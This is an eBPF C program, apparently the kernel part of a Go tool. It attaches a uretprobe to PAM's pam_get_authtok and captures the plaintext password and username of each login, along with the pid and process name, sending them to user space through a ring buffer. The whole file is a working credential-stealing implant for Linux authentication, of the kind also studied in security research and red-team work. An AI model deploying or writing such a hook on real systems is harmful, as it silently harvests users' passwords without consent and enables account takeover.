//go:build ignore

#include "vmlinux.h"
#include "uretprobe.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char __license[] SEC("license") = "Dual MIT/GPL";

struct
{
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 4 * 1024);
} rb SEC(".maps");


SEC("uretprobe/pam_get_authtok")
int trace_pam_get_authtok(struct pt_regs *ctx)
{
  // skip if the first param is null
  if (!PT_REGS_PARM1(ctx))
    return 0;

  // retrieve the first param
  pam_handle_t* phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);

  // we'll track the pid
  u32 pid = bpf_get_current_pid_tgid() >> 32;

  // get the address of phandle->authtok
  u64 password_addr = 0;
  bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);

  // get the address of phandle->user
  u64 username_addr = 0;
  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

  if (!password_addr || !username_addr)
    return 0;

  // create an event that we'll pass into the ring buffer
  event_t *e;
  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
  if (e)
  {
    e->pid = pid;
    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    bpf_ringbuf_submit(e, 0);
  }
  return 0;
};
